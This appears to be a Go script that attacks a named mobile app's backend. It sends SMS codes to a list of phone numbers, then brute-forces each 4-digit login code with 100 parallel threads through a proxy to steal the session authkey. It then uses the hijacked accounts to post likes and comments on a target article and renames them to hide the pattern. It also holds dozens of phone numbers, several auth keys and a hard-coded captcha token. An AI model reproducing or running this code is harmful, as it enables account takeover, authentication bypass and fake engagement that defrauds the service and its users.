package main

import (
	"encoding/json"
	"fmt"
	"log"
	"os"
	"sync"
	"time"

	"github.com/ipiao/remote"
)

var accessalbeProxys = []string{
	"https://1.71.188.37:3128",
	"http://183.56.177.130:808",
	"https://218.60.8.83:3129",
}

var users = []*User{
	// {"13545635678", ""},
	// {"13805790176", "597b39ac7db54feab201cc015d0c9b2f"},
	// {"15068879222", "1d01e49589e34594b162edd697a8522f"},
	// {"15068169473", "27a71ea4cc414898ab82abbfb081d4f9"},
	// {"15068724628", "7c86ba50d30348f883debde5e05bbc42"},
	// {"15906690378", "3f0fdbfd25674abaa95aa802da127008"},

	// {Phone: "15906690568", Authkey: "", Comment: "人在塔在", NickName: "盖轮"},
	// {Phone: "18989898901", Authkey: "", Comment: "犯我德邦者，虽远必诛", NickName: "嘉文"},
	// {Phone: "18989898919", Authkey: "", Comment: "我用双手成就你的梦想", NickName: "盲僧"},
	// {Phone: "13023686868", Authkey: "", Comment: "我也是石头里蹦出来的，为什么不是猴子呢", NickName: "石头人"},
	// {Phone: "13282828883", Authkey: "", Comment: "想去哪就去哪", NickName: "蒙多"},

	// {Phone: "13282828258", Authkey: "", Comment: "楼下什么鬼？组队吗，我压缩贼6", NickName: "快乐风男"},
	// {Phone: "13968055822", Authkey: "", Comment: "打乱队形，M37星云欢迎你", NickName: "迪迦奥特曼"},
	// {Phone: "15068733184", Authkey: "", Comment: "青青草原都没了，老子还没吃到羊", NickName: "灰太狼"},
	// {Phone: "15068734285", Authkey: "", Comment: "这里有人想摘下我的面具吗", NickName: "牛战士"},
	// {Phone: "15988866676", Authkey: "", Comment: "要用魔法打败魔法", NickName: "老爹"},

	// {Phone: "18458888850", Authkey: "", Comment: "小姐姐最好看了", NickName: ""},
	// {Phone: "18458888835", Authkey: "", Comment: "送你上第一", NickName: ""},
	// {Phone: "18458888829", Authkey: "", Comment: "加油加油", NickName: "qwer"},
	// {Phone: "18458888825", Authkey: "", Comment: "为什么还有个男的？", NickName: "这是一个昵称"},
	// {Phone: "18458888875", Authkey: "", Comment: "卖竹鼠了", NickName: "豆芽"},
	// {Phone: "15068871144", Authkey: "", Comment: "最美最美最美最美", NickName: "姜太虚"},

	// {Phone: "15988848586", Authkey: "", Comment: "全世界只有一个你，我好好珍惜", NickName: ""},
	// {Phone: "15068724744", Authkey: "", Comment: "perfect！！", NickName: "老王"},
	// {Phone: "15906690368", Authkey: "", Comment: "加油加油", NickName: "qqqq"},
	// {Phone: "13003634131", Authkey: "", Comment: "有意思", NickName: "阿宝"},
	// {Phone: "13675841881", Authkey: "", Comment: "you are so show", NickName: "cnidaria"},
	// {Phone: "13282111119", Authkey: "", Comment: "美美美美美美", NickName: "饕餮"},

	// {Phone: "13588383837", Authkey: "", Comment: "支持支持", NickName: "郑～"},
	// {Phone: "13282828885", Authkey: "", Comment: "这姑娘不错", NickName: "好好先生"},
	// {Phone: "13282118888", Authkey: "", Comment: "我就评论7个字", NickName: "颐达"},
	// {Phone: "13282828299", Authkey: "", Comment: "大姑娘了。。", NickName: "波波波"},
	// {Phone: "15068733353", Authkey: "", Comment: "赞赞赞", NickName: "竹笋"},
	{Phone: "15068734215", Authkey: "", Comment: "6666666666", NickName: "娜娜"},

	{Phone: "13282121314", Authkey: "", Comment: "这。。。。。好看", NickName: "老猫"},
	{Phone: "18458888851", Authkey: "", Comment: "小姐姐好漂亮哦", NickName: ""},
	{Phone: "18458888839", Authkey: "", Comment: "1111111", NickName: "宋--"},
	{Phone: "18458888832", Authkey: "", Comment: "火火火火火", NickName: ""},
	{Phone: "18458888827", Authkey: "", Comment: "qaq,第一第一第一", NickName: "a_6"},
	{Phone: "18458888823", Authkey: "", Comment: "路过", NickName: "陆游"},
	{Phone: "18458888873", Authkey: "", Comment: "好久不见啊", NickName: "小薇"},
}

type User struct {
	Phone    string
	Authkey  string
	Comment  string
	NickName string
	Success  bool
	Error    error
}

func main() {
	// store := remote.NewXiciRedisStore("118.25.7.38:6379", "", remote.XiciProxyTypeNT)
	// // store.Clear()
	// err := remote.InitXiCiIppool([]int{1}, remote.XiciProxyTypeNT, store)
	// if err != nil {
	// 	panic(err)
	// }
	// rs, err := remote.NewProxyRemoteStoreTimeout("https://nsj-m.yy0578.com", 0, store, time.Second*3)
	// if err != nil {
	// 	panic(err)
	// }

	// r, err := rs.New()
	// if err != nil {
	// 	panic(err)
	// }
	f, err1 := os.Create(fmt.Sprintf("user_%d", time.Now().Unix()))
	if err1 != nil {
		panic(err1)
	}
	defer f.Close()

	for i, user := range users {
		defer func(j int) {
			b, _ := remote.EnJSON(&users[j])
			f.Write(b)
			f.Write([]byte{'\n'})
		}(i)

		var err error
		r := remote.NewProxyRemote("https://nsj-m.yy0578.com", "https://1.71.188.37:3128")
		// r := remote.NewRemote("https://nsj-m.yy0578.com")

		// 获取token
		req := map[string]interface{}{}
		ret := make(map[string]interface{})
		// err = r.Post("/v2/imagescode/gettokennum", req, &ret)
		// if err != nil {
		// 	panic(err)
		// }
		// log.Println("gettokennum:", ret)
		// token := ret["Token"].(string)
		token := "KOn189bBNmbo-DALJ9dGE53MK3FANl5A9_hFB7dcS4EtWrvmtLH8G34fow3tjTfRvH_F4lOJBD-qgr4Jyn0akxe61AJiDHpegfmJssy_jVk="

		// 发送短信
		phone := user.Phone
		req = map[string]interface{}{
			"deviceId":    "A0644CSC-5FFB-431B-DFD1-323C2F34537D",
			"appVersion":  "1.0.2",
			"deviceName":  "iPhone10.2(iOS11.4)",
			"code":        "3155",
			"smsCodeType": 1,
			"deviceType":  "2",
			"mobilePhone": phone,
			"token":       token,
		}
		err = r.Post("/v1/smsController/sendVerifyCode", req, &ret)
		if err != nil {
			user.Error = err
			return
		}
		log.Println("sendVerifyCode", ret)
		time.Sleep(time.Second * 2)
		// 刷登录接口
		var authKey string
		var uid int

		gonums := 100
		done := make(chan int, gonums-1)
		wg := sync.WaitGroup{}
		for i := 0; i < gonums; i++ {
			wg.Add(1)
			go func(c int) {
				nr := remote.NewProxyRemote("https://nsj-m.yy0578.com", "https://1.71.188.37:3128")
				for j := 0; j < 10000/gonums; j++ {
					select {
					case <-done:
						wg.Done()
						return
					case <-time.After(time.Millisecond * 5):
						smsCode := fmt.Sprintf("%04d", c*10000/gonums+j)
						log.Println(smsCode)
						nreq := map[string]interface{}{
							"deviceName":          "iPhone10.2(iOS11.4)",
							"loginAccount":        phone,
							"deviceId":            "A0644CSC-5FFB-431B-DFD1-323C2F34537D",
							"smsVerificationCode": smsCode,
							"appVersion":          "1.0.2",
							"deviceType":          "2",
						}
						nret := map[string]interface{}{}
						err = nr.Post("/v1/userAccount/login", nreq, &nret)
						if err != nil {
							// log.Println("login err:", err)
							continue
						}
						if ak, ok := nret["authkey"]; ok {
							authKey = ak.(string)
							user.Authkey = authKey
							wg.Done()
							for k := 0; k < gonums-1; k++ {
								done <- k
							}
							log.Println("login success:", nret)

							if acc, ok1 := nret["userAccount"]; ok1 {
								if accM, ok2 := acc.(map[string]interface{}); ok2 {
									if uidStr, ok3 := accM["id"]; ok3 {
										id, _ := uidStr.(json.Number).Int64()
										uid = int(id)
									}
								}
							}
							return
						}
						// log.Println("login return:", nret)
					}
				}
			}(i)
		}
		wg.Wait()

		// 点赞
		req = map[string]interface{}{
			"deviceName": "iPhone10.2(iOS11.4)",
			"deviceId":   "A0644CSC-5FFB-431B-DFD1-323C2F34537D",
			"appVersion": "1.0.2",
			"praisesRelation": map[string]interface{}{
				"detailsId":   654,
				"praisesType": 1,
			},
			"deviceType": "2",
		}
		request1, err := r.CovertRequest("POST", "/v1/bbs/addPraise", req)
		if err != nil {
			log.Println("addPraise CovertRequest error:", err)
		}
		request1.Header.Set("authkey", authKey)
		bs, err := r.CallRequest(request1)
		if err != nil {
			log.Println("CallRequest:", err)
		}
		err = remote.DeJSON(bs, &ret)
		if err != nil {
			log.Println(err)
		}
		log.Println("addPraise return:", ret)

		// 评论
		req = map[string]interface{}{
			"deviceName": "iPhone10.2(iOS11.4)",
			"deviceId":   "A0644CSC-5FFB-431B-DFD1-323C2F34537D",
			"comment": map[string]interface{}{
				"detailsId":   654,
				"commentText": user.Comment,
			},
			"posterId":   10000007,
			"appVersion": "1.0.2",
			"deviceType": "2",
		}
		request2, err := r.CovertRequest("POST", "/v1/bbs/addComment", req)
		if err != nil {
			log.Println(err)
		}
		request2.Header.Set("authkey", authKey)
		bs, err = r.CallRequest(request2)
		if err != nil {
			log.Println(ret)
		}
		err = remote.DeJSON(bs, &ret)
		if err != nil {
			log.Println(err)
		}
		log.Println("addComment return:", ret)

		// 改名
		if user.NickName != "" {
			req = map[string]interface{}{
				"deviceId":   "4D5535B3-5371-48FC-884C-439A2E493EFF",
				"uid":        uid,
				"appVersion": "1.0.2",
				"deviceName": "iPhone9.2(iOS12.0)",
				"deviceType": "2",
				"sex":        "1",
				"nickName":   user.NickName,
			}
			request3, err := r.CovertRequest("POST", "/v1/userAccount/updateUserInfoById", req)
			if err != nil {
				log.Println(err)
			}
			request3.Header.Set("authkey", authKey)
			bs, err = r.CallRequest(request3)
			if err != nil {
				log.Println(ret)
			}
			err = remote.DeJSON(bs, &ret)
			if err != nil {
				log.Println(err)
			}
			user.Success = true
			log.Println("updateUserInfoById return:", ret)
		}

		log.Println(phone, authKey, uid)
		time.Sleep(time.Second * 10)
	}
}

//**** 实现过程
// 1. 获取验证码token
// 2. 用token获取图形验证码
// 3. 解析验证码图片，得到验证码
// 3.5 前三部目前手动操作，抓包token和验证码，在第四步写死，（可以重复利用 token和图形验证码）
// 4. 根据token，验证码，随机获取一个手机号，调用短信接口（新用户会注册）
// 5. 多线程异步调用登陆接口（轮询验证码0000-9999），成功后获取uid和authkey
// 6,7 根据authkey点赞，评论指定文章
// 8. 调用改名接口，避免界面上出现连号评论
